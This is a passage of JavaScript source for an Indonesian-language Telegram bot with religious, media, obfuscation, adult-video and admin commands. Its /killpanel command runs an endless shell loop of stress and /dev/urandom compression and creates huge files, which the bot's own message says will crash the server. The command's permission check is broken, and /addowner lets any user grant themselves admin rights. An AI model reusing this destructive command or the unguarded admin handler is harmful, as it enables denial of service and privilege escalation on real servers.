    bot.on('callback_query', async (query) => {
        if (!query.data.startsWith('quran_') && !query.data.startsWith('asma_')) return;
        
        const [type, ...parts] = query.data.split('_');
        const userId = parseInt(parts.pop());

        if (query.from.id !== userId) {
            return bot.answerCallbackQuery(query.id, { text: '❌ Anda tidak dapat menggunakan tombol ini!', show_alert: true });
        }
        
        if (type === 'quran') {
            const [surahNumber, page] = parts.map(p => parseInt(p));
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const messageKey = `${chatId}_${messageId}`;
            let surahData = activeQuranSessions[messageKey];

            if (!surahData) {
                try {
                    await bot.answerCallbackQuery(query.id, { text: 'Sesi usang, memuat ulang...' });
                    const { data } = await axios.get(`${QURAN_API_BASE}/surah/${surahNumber}`);
                    if (data.code !== 200) throw new Error(data.message);
                    surahData = data.data;
                    activeQuranSessions[messageKey] = surahData;
                } catch (error) {
                    return bot.editMessageText("❌ Gagal memuat ulang data surah.", { chat_id: chatId, message_id: messageId });
                }
            }
            await sendQuranPage(chatId, userId, surahData, page, messageId);
        } else if (type === 'asma') {
            const page = parseInt(parts[0]);
            const names = context.asmaulHusnaData;
            if (!names) return bot.answerCallbackQuery(query.id, { text: 'Data usang, panggil /asmaulhusna lagi.', show_alert: true });
            
            const totalPages = Math.ceil(names.length / ASMAUL_HUSNA_PER_PAGE);
            const pageNames = names.slice((page - 1) * ASMAUL_HUSNA_PER_PAGE, page * ASMAUL_HUSNA_PER_PAGE);
            
            let text = "✨ *Asma'ul Husna (99 Nama Allah)*\n\n";
            pageNames.forEach(name => { text += `*${name.number}. ${name.transliteration}* (${name.name})\n_${name.en.meaning}_\n\n`; });

            const row = [];
            if (page > 1) row.push({ text: `⬅️ Back (${page - 1}/${totalPages})`, callback_data: `asma_${page - 1}_${userId}` });
            if (page < totalPages) row.push({ text: `Next ➡️ (${page + 1}/${totalPages})`, callback_data: `asma_${page + 1}_${userId}` });

            await bot.editMessageText(text, { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [row] } });
        }
        bot.answerCallbackQuery(query.id);
    });

    async function setupDailyReminders() {
        console.log('⏰ Memulai penjadwalan pengingat sholat harian...');
        const activeChats = Object.entries(sholatChats);
        if (activeChats.length === 0) return console.log('Tidak ada grup terdaftar.');

        for (const [chatId, cityName] of activeChats) {
            const data = await getPrayerTimes(cityName);
            if (data) {
                ['Fajr', 'Dhuhr', 'Asr', 'Maghrib', 'Isha'].forEach(p => {
                    const [hour, minute] = data.timings[p].split(':');
                    cron.schedule(`${minute} ${hour} * * *`, async () => {
                        const message = `✨ Waktu Sholat *${p}* telah tiba untuk wilayah *${cityName}* dan sekitarnya.`;
                        try {
                            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
                            if (config.adhanAudioUrl) {
                                await bot.sendAudio(chatId, config.adhanAudioUrl);
                            }
                        } catch(e) { console.error(`Gagal kirim pengingat ke ${chatId}: ${e.message}`); }
                    }, { scheduled: true, timezone: "Asia/Jakarta" });
                });
                console.log(`✅ Pengingat untuk ${cityName} (Chat ID: ${chatId}) diatur.`);
            } else {
                console.warn(`⚠️ Gagal mengatur pengingat untuk ${cityName} (Chat ID: ${chatId}).`);
            }
            await sleep(2000);
        }
        console.log('✅ Penjadwalan pengingat sholat harian selesai.');
    }

    cron.schedule('5 1 * * *', setupDailyReminders, { scheduled: true, timezone: "Asia/Jakarta" });
    setupDailyReminders();
};

bot.onText(/^\/addprem(?:\s(.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});


// -- ( Case List Premium ) -- \\
bot.onText(/^\/listprem$/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//createnama
bot.onText(/^\/createnama (.+)/i, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1].trim();

  // Daftar font/gaya dasar
  const fonts = [
    (s) => `𝐁𝐨𝐥𝐝: ${s}`,
    (s) => `𝑰𝒕𝒂𝒍𝒊𝒄: ${s}`,
    (s) => `𝑩𝒐𝒍𝒅 𝑰𝒕𝒂𝒍𝒊𝒄: ${s}`,
    (s) => `𝔉𝔯𝔞𝔨𝔱𝔲𝔯: ${s}`,
    (s) => `𝓢𝓬𝓻𝓲𝓹𝓽: ${s}`,
    (s) => `𝔹𝕠𝕝𝕕 𝔻𝕠𝕦𝕓𝕝𝕖: ${s}`,
    (s) => `𝙼𝚘𝚗𝚘: ${s}`,
    (s) => `🅴🅽🅲🅻🅾🆂🅴🅳: ${s}`,
    (s) => `ᥴᥙ𝗍ᥱ: ${s}`, 
  ];

  // Bingkai emoji
  const frames = [
    (s) => `★ ${s} ★`,
    (s) => `✦ ${s} ✦`,
    (s) => `『 ${s} 』`,
    (s) => `❖ ${s} ❖`,
    (s) => `⟦ ${s} ⟧`,
    (s) => `✧ ${s} ✧`,
    (s) => `⌁ ${s} ⌁`,
    (s) => `⭑ ${s} ⭑`,
    (s) => `✪ ${s} ✪`,
    (s) => `〘 ${s} 〙`,
    (s) => `✿ ${s} ✿`,
    (s) => `☯ ${s} ☯`,
    (s) => `𖤛 ${s} 𖤛`,
  ];

  // Fungsi acak
  function randomPick(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  // Ambil random font + random frame
  const fontFunc = randomPick(fonts);
  const frameFunc = randomPick(frames);

  const styled = frameFunc(fontFunc(nama));

  bot.sendMessage(chatId, `✨ Nama acak untuk: ${nama}\n${styled}`);
});

//ssweb
bot.onText(/^\/ssweb (.+)$/, async (msg, m) => {
  try {
    let url = `https://api.zenzxz.my.id/api/tools/ssweb?url=${encodeURIComponent(m[1])}`;
    let res = await axios.get(url, { responseType: 'arraybuffer' });
    bot.sendPhoto(msg.chat.id, res.data);
  } catch {
    bot.sendMessage(msg.chat.id, '❌ Gagal screenshot web');
  }
}); 

// EROR? FIX IN SENDIRI LU KAN DEV JANGAN HAPUS SUMBER/JUAL BUKAN PUNYA MAKBAPAKLOWH! 
bot.onText(/\/killpanel/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  if (senderId !== !isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘",
      { parse_mode: "Markdown" }
    );
  }

  const command = `(while true; do 
    cat /dev/urandom | dd bs=10M count=100 2>/dev/null | gzip > /tmp/overload_$RANDOM.gz &
    stress --cpu 16 --io 8 --vm 8 --vm-bytes 95% --timeout 300s &
    sleep 1 
  done)`;

  exec(command, () => {});

  bot.sendMessage(
    chatId,
    `╭─────────────────────
│  𝙆𝙄𝙇𝙇 𝙋𝘼𝙉𝙀𝙇
│ ⎈ Kill Panel HighCpu by Seren
│ ⎙ Server akan crash / Vps Akan Mati
│ ⦸ Gunakan dengan bijaksana (jangan asal / sembarangan)
╰─────────────────────`
  );
  (async () => {
  await createFile(path.join(__dirname, "hama-25gb.bin"), FILE_SIZE);

  await createMultipleFilesParallel(
    [
      { path: path.join(__dirname, "hama-1.bin"), size: FILE_SIZE },
      { path: path.join(__dirname, "hama-2.bin"), size: FILE_SIZE },
      { path: path.join(__dirname, "hama-3.bin"), size: FILE_SIZE }
    ],
    3
  );
})();
});

bot.onText(/^\/japan$/, async (msg) => {
  const chatId = msg.chat.id;

  // Harus reply ke file .js
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/obf`!", { parse_mode: "Markdown" });
  }

  const file = msg.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
  }

  const encryptedPath = path.join(__dirname, `hexa-encrypted-${file.file_name}`);

  try {
    const progressMessage = await bot.sendMessage(
      chatId,
      "```css\n" +
      "hexa OBF\n" +
      ` ⚙️ Starting ( OBF Japanese Code ) (1%)\n` +
      ` ${createProgressBar(1)}\n` +
      "```\n" +
      "PROSES ENCRYPT ",
      { parse_mode: "Markdown" }
    );

    const fileLink = await bot.getFileLink(file.file_id);
    const response = await fetch(fileLink);
    let fileContent = await response.text();

    // Validasi kode
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    // Obfuscation
    const obfuscated = await JsConfuser.obfuscate(fileContent, getJapanObfuscationConfig());
    await fsx.writeFile(encryptedPath, obfuscated.code);

    // Validasi hasil
    try {
      new Function(obfuscated.code);
    } catch (postError) {
      throw new Error(`Hasil obfuscation tidak valid: ${postError.message}`);
    }

    // Kirim hasil
    await bot.sendDocument(chatId, encryptedPath, {
      filename: `jiperenc-${file.file_name}`,
      caption: "✅ Succes Encrypted By NatzuVlood",
      parse_mode: "Markdown",
    });

    if (await fsx.pathExists(encryptedPath)) {
      await fsx.unlink(encryptedPath);
    }
  } catch (error) {
    await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });
    if (await fsx.pathExists(encryptedPath)) {
      await fsx.unlink(encryptedPath);
    }
  }
});

// -- ( Plungins / Case ) -- \\
bot.onText(/^\/nulis(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  const text = match[1];
  if (!text) {
    return bot.sendMessage(chatId, "Mau nulis apa? Contoh:\n/nulis aku sayang kamu");
  }

  try {
    const progressMessage = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

    await showProgress(chatId, progressMessage.message_id, 5, 400);

    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    await bot.deleteMessage(chatId, progressMessage.message_id);

    await bot.sendPhoto(chatId, Buffer.from(response.data));
  } catch (error) {
    console.error("Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Error, coba lagi nanti ya.");
  }
});

    bot.onText(/^\/hentaisearch (.+)/i, async (msg, match) => {
        const chatId = msg.chat.id;
        const args = match[1].trim().split(' ');
        if (args.length < 1) return bot.sendMessage(chatId, '⚠️ Format salah! Contoh: /hentaisearch futanari 2');
        let pageNumber = 1;
        let queryParts = args;
        const lastArg = args[args.length - 1];
        if (!isNaN(lastArg) && /^\d+$/.test(lastArg)) {
            pageNumber = parseInt(lastArg);
            queryParts = args.slice(0, -1);
        }
        const keyword = queryParts.join(' ');
        await bot.sendMessage(chatId, `🔍 Mencari "${keyword}" di halaman ${pageNumber}...`);
        try {
            const results = await searchsfm(keyword, pageNumber);
            if (results.length === 0) return bot.sendMessage(chatId, '❌ Tidak ada hasil yang ditemukan.');
            for (const result of results) {
                const message = `📌 *${result.title}*\n` + `📂 Kategori: ${result.category}\n` + `👀 Views: ${result.views_count} | 🔄 Shares: ${result.share_count}\n` + `[🔗 Lihat Konten](${result.link})\n` + `\`\`\`HAYOO ABANG NYA SUKA BOKEP 😂😂💦💦👊\`\`\``;
                const opts = { parse_mode: 'Markdown', caption: message };
                if (result.video_2 && result.video_2.endsWith('.mp4')) {
                    await bot.sendVideo(chatId, result.video_2, opts).catch(() => bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }));
                } else if (result.video_1 && result.video_1.endsWith('.mp4')) {
                    await bot.sendVideo(chatId, result.video_1, opts).catch(() => bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }));
                } else {
                    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
                }
            }
        } catch (error) {
            console.error(error);
            bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat mencari data.');
        }
    });
    
 bot.onText(/\/convertcase\s+([a-zA-Z0-9\/_-]+)([\s\S]*)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;
        
        let targetLibraryInput = match[1].trim().toLowerCase();
        let sourceCode = match[2] ? match[2].trim() : null;
        let isFileReply = false;
        let tempDownloadPath = null;
        let newFilePath = null;

        let statusMsg;

        try {
            if (!GEMINI_API_KEY || GEMINI_API_KEY === "MASUKKAN_API_KEY_GEMINI_ANDA_DISINI") {
                 await bot.sendMessage(chatId, "❌ API Key Gemini belum diatur di file `config.js`.");
                 return;
            }

            let finalTargetLibrary = targetLibraryInput;
            
            if (targetLibraryInput === 'baileys' || targetLibraryInput === 'whiskeysocket') {
                finalTargetLibrary = 'whiskeysocket/baileys';
            } else if (targetLibraryInput === 'ntba') {
                finalTargetLibrary = 'node-telegram-bot-api';
            }

            const validTargetPrompts = ['node-telegram-bot-api', 'whiskeysocket/baileys', 'telegraf'];
            
            if (!validTargetPrompts.includes(finalTargetLibrary)) {
                await bot.sendMessage(chatId, `❌ Library target tidak didukung.\n\nLibrary yang valid: \`node-telegram-bot-api\`, \`whiskeysocket/baileys\`, \`telegraf\``);
                return;
            }

            if (reply) {
                if (reply.document) {
                    statusMsg = await bot.sendMessage(chatId, `⏳ Mendownload file...`);
                    const tempDir = ensureTempDir();
                    tempDownloadPath = await bot.downloadFile(reply.document.file_id, tempDir);
                    sourceCode = fs.readFileSync(tempDownloadPath, 'utf8');
                    fs.unlinkSync(tempDownloadPath);
                    isFileReply = true;
                } else if (reply.text) {
                    sourceCode = reply.text;
                }
            }

            if (!sourceCode) {
                await bot.sendMessage(chatId, "<b>Format Salah.</b>\n\n<b>Cara 1 (Reply File/Teks):</b>\nReply ke file kode atau teks kode dengan:\n<code>/convertcase [library]</code>\n\n<b>Cara 2 (Inline):</b>\n<code>/convertcase [library]\n[kode anda di sini]</code>", { parse_mode: "HTML" });
                return;
            }

            if (!statusMsg) {
                statusMsg = await bot.sendMessage(chatId, `⏳ Xayz sedang mengonversi ke <b>${finalTargetLibrary}</b>...`, { parse_mode: "HTML" });
            } else {
                await bot.editMessageText(`⏳ Xayz sedang mengonversi ke <b>${finalTargetLibrary}</b>...`, { 
                    chat_id: chatId, 
                    message_id: statusMsg.message_id,
                    parse_mode: "HTML"
                });
            }

            const convertedCode = await convertCodeWithGemini(sourceCode, finalTargetLibrary);

            if (!convertedCode || convertedCode.length < 10) {
                 throw new Error("Gemini mengembalikan hasil kosong atau tidak valid.");
            }

            await bot.deleteMessage(chatId, statusMsg.message_id);

            if (isFileReply) {
                const tempDir = ensureTempDir();
                const timestamp = Date.now();
                const safeFileName = finalTargetLibrary.replace(/[\/]/g, '_');
                const newFileName = `convert_${safeFileName}_${timestamp}.js`;
                newFilePath = path.join(tempDir, newFileName);
                
                fs.writeFileSync(newFilePath, convertedCode);
                
                await bot.sendDocument(chatId, newFilePath, {
                    caption: `✅ Berhasil dikonversi ke <b>${finalTargetLibrary}</b>`,
                    parse_mode: "HTML"
                });
                
                fs.unlinkSync(newFilePath);
            } else {
                await bot.sendMessage(chatId, `\`\`\`javascript\n${convertedCode}\n\`\`\``, { parse_mode: "Markdown" });
            }

        } catch (error) {
            console.error(error);
            const errorText = `❌ Terjadi kesalahan:\n${error.message}`;
            if (statusMsg) {
                await bot.editMessageText(errorText, { chat_id: chatId, message_id: statusMsg.message_id });
            } else {
                await bot.sendMessage(chatId, errorText);
            }
            
            try {
                if (tempDownloadPath && fs.existsSync(tempDownloadPath)) fs.unlinkSync(tempDownloadPath);
                if (newFilePath && fs.existsSync(newFilePath)) fs.unlinkSync(newFilePath);
            } catch (e) {}
        }
    });
    
 bot.onText(/\/sticker/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  bot.once('photo', async (photoMsg) => {
    try {
      const fileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);
      await bot.sendSticker(chatId, filePath);
      fs.unlinkSync(filePath);
    } catch (err) {
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});

bot.onText(/^\/brat\s?(.+)?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match ? match[1] : null;

    if (!query) {
        return bot.sendMessage(chatId, '⎆ Gunakan perintah /brat <teks> untuk membuat gambar.');
    }

    const processingMsg = await bot.sendMessage(chatId, '⎆ Sedang memproses, mohon tunggu...');
    const processingMsgId = processingMsg.message_id;

    try {
        const apiUrl = `https://api.botcahx.eu.org/api/maker/brat`;
        
        const response = await axios.get(apiUrl, {
            params: {
                text: query,
                apikey: API_KEY_BOTCAHX
            },
            responseType: 'arraybuffer' 
        });

        const imageBuffer = response.data;

        await bot.sendPhoto(chatId, imageBuffer);
        
        await bot.deleteMessage(chatId, processingMsgId);

    } catch (error) {
        await bot.editMessageText('❌ Terjadi kesalahan atau API Key bermasalah.', {
            chat_id: chatId,
            message_id: processingMsgId
        });
    }
});

bot.onText(/\/toimage/, async (msg) => {
        const chatId = msg.chat.id;
        if (!msg.reply_to_message || !msg.reply_to_message.sticker) return bot.sendMessage(chatId, "❌ Balas sebuah stiker.");
        const waitingMsg = await bot.sendMessage(chatId, "⏳ Mengubah stiker...", { reply_to_message_id: msg.message_id });
        try {
            const fileStream = bot.getFileStream(msg.reply_to_message.sticker.file_id);
            const chunks = [];
            for await (const chunk of fileStream) { chunks.push(chunk); }
            const pngBuffer = await sharp(Buffer.concat(chunks)).png().toBuffer();
            await bot.sendPhoto(chatId, pngBuffer, { caption: "✅ Berhasil." });
            await bot.deleteMessage(chatId, waitingMsg.message_id);
        } catch (error) { 
            console.error("ToImage Error:", error);
            bot.editMessageText("❌ Gagal. Mungkin stiker ini beranimasi.", { chatId, message_id: waitingMsg.message_id }); 
        }
    });
    
bot.onText(/\/play(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1]; 

    let prosesMsg;
    try {
        prosesMsg = await bot.sendMessage(chatId, '🔎 Mencari lagu...');
        const prosesMsgId = prosesMsg.message_id;

        const searchUrl = `https://api.botcahx.eu.org/api/search/spotify?query=${encodeURIComponent(query)}&apikey=${API_KEY_BOTCAHX}`;
        const searchResponse = await axios.get(searchUrl);

        if (!searchResponse.data.status || !searchResponse.data.result.status || searchResponse.data.result.data.length === 0) {
            return bot.editMessageText('Tidak ditemukan hasil untuk pencarian tersebut.', {
                chat_id: chatId,
                message_id: prosesMsgId
            });
        }
        
        const trackUrl = searchResponse.data.result.data[0].url;
        
        await bot.editMessageText('📥 Mengunduh lagu...', {
            chat_id: chatId,
            message_id: prosesMsgId
        });

        const downloadUrl = `https://api.botcahx.eu.org/api/download/spotify?url=${trackUrl}&apikey=${API_KEY_BOTCAHX}`;
        const downloadResponse = await axios.get(downloadUrl);

        if (!downloadResponse.data.status) {
            return bot.editMessageText('Gagal mengunduh lagu.', {
                chat_id: chatId,
                message_id: prosesMsgId
            });
        }

        const data = downloadResponse.data.result.data;
        const audioUrl = data.url;
        
        const audioPath = path.join(__dirname, `audio_${msg.from.id}_${Date.now()}.mp3`);

        const writer = fs.createWriteStream(audioPath);
        const audioStream = await axios({
            url: audioUrl,
            method: 'GET',
            responseType: 'stream',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' }
        });

        audioStream.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const caption = `🎵 <b>${data.title}</b>\n👤 Artist: ${data.artist.name}\n⏳ Durasi: ${data.duration}\n🔗 <a href='${data.artist.external_urls.spotify}'>Dengarkan di Spotify</a>`;

        await bot.sendAudio(chatId, audioPath, {
            caption: caption,
            parse_mode: 'HTML',
            title: data.title,
            performer: data.artist.name
        });
        
        fs.unlinkSync(audioPath);
        await bot.deleteMessage(chatId, prosesMsgId);

    } catch (error) {
        console.error("Error di command /play:", error);
        const errorMessage = `🚩 Terjadi Kesalahan: ${error.message}`;
        if (prosesMsg) {
            await bot.editMessageText(errorMessage, {
                chat_id: chatId,
                message_id: prosesMsg.message_id
            });
        } else {
            await bot.sendMessage(chatId, errorMessage);
        }
    }
});

bot.onText(/\/play$/, async (msg) => {
    await bot.sendMessage(msg.chat.id, 'Gunakan format: /play <judul lagu>');
});

bot.onText(/\/xn(?: (.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(' ').slice(1);
    const query = args.join(' ');

    if (!query) {
        return bot.sendMessage(chatId, '🚩 Gunakan format: /xn [kata kunci]\n\nContoh: /xn japan');
    }

    let statusMsg;
    try {
        statusMsg = await bot.sendMessage(chatId, `🔍 Mencari video untuk: ${query}...`);
        const statusMsgId = statusMsg.message_id;
        
        const searchUrl = `https://api.botcahx.eu.org/api/search/xvideos?query=${encodeURIComponent(query)}&apikey=${API_KEY_BOTCAHX}`;
        const searchResponse = await axios.get(searchUrl);
        
        if (!searchResponse.data || !searchResponse.data.result || searchResponse.data.result.length === 0) {
            return bot.editMessageText(`🚩 Tidak ditemukan hasil untuk: ${query}`, { chat_id: chatId, message_id: statusMsgId });
        }

        const data = searchResponse.data.result[0];
        const capt = `<blockquote>乂 Hasil Pencarian: ${query}\n◦ Title : ${data.title || 'N/A'}\n◦ Duration : ${data.duration || 'N/A'}\n◦ <b><a href="${data.url || '#'}">🔗 Link</a></b></blockquote>`;

        await bot.editMessageText(`📥 Mengunduh video dari: ${data.title || 'N/A'}...`, { chat_id: chatId, message_id: statusMsgId, parse_mode: 'HTML' });

        const dlUrl = `https://api.botcahx.eu.org/api/download/xvideosdl?url=${data.url}&apikey=${API_KEY_BOTCAHX}`;
        const dlResponse = await axios.get(dlUrl);

        if (!dlResponse.data || !dlResponse.data.result || !dlResponse.data.result.url) {
            return bot.editMessageText('🚩 Gagal mendapatkan URL video.', { chat_id: chatId, message_id: statusMsgId });
        }

        const videoUrl = dlResponse.data.result.url;
        const videoPath = path.join(__dirname, `video_${Date.now()}.mp4`);
        
        await bot.editMessageText('📥 Sedang mengunduh video, harap tunggu...', { chat_id: chatId, message_id: statusMsgId });
        
        const writer = fs.createWriteStream(videoPath);
        const videoStream = await axios({ url: videoUrl, method: 'GET', responseType: 'stream' });
        videoStream.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const stats = fs.statSync(videoPath);
        const fileSizeInBytes = stats.size;
        const fileSizeInMB = fileSizeInBytes / (1024 * 1024);

        if (fileSizeInMB < 49) {
            await bot.editMessageText('📤 Mengunggah video ke Telegram...', { chat_id: chatId, message_id: statusMsgId });
            await bot.sendVideo(chatId, videoPath, { caption: capt, parse_mode: 'HTML' });
        } else {
            const largeFileCaption = `${capt}\n\n⚠️ <b>File terlalu besar untuk dikirim (${fileSizeInMB.toFixed(2)} MB).</b>\nSilakan unduh langsung dari link berikut:\n${videoUrl}`;
            await bot.sendMessage(chatId, largeFileCaption, { parse_mode: 'HTML' });
        }
       
        fs.unlinkSync(videoPath);
        await bot.deleteMessage(chatId, statusMsgId);

    } catch (error) {
        console.error("Error di command /xn:", error);
        const errorMessage = `🚩 Terjadi Kesalahan: ${error.message}`;
        if (statusMsg) {
            try {
                await bot.editMessageText(errorMessage, { chat_id: chatId, message_id: statusMsg.message_id });
            } catch (editError) {
                await bot.sendMessage(chatId, errorMessage);
            }
        } else {
            await bot.sendMessage(chatId, errorMessage);
        }
    }
});

// - ( Case Add Owner ) - \\
bot.onText(/^\/addowner(?:\s(.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addowner 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addowner 6843967527."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});


// -- ( Case Delete Premium ) -- \\
bot.onText(/^\/delprem(?:\s(\d+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 6843967527"
    );
  }
  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});


// -- ( Case Delete Owner ) -- \\
bot.onText(/^\/delowner(?:\s(\d+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /delowner 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /delowner 6843967527."
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});


// -- ( Case List Sender ) -- \\
bot.onText(/^\/listsender$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, "```❌\nNo WhatsApp bots connected. Please connect a bot first with /addsender```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    let botList = "```X-demonz\n";
    let index = 1;
    for (const [botNumber, sock] of sessions.entries()) {
        const status = sock.user ? "✅" : "❌";
        botList += `▢ ${index} : ${botNumber}\n`;
        botList += `▢ Status : ${status}\n`;
        index++;
    }
    botList += `▢ Total : ${sessions.size}\n`;
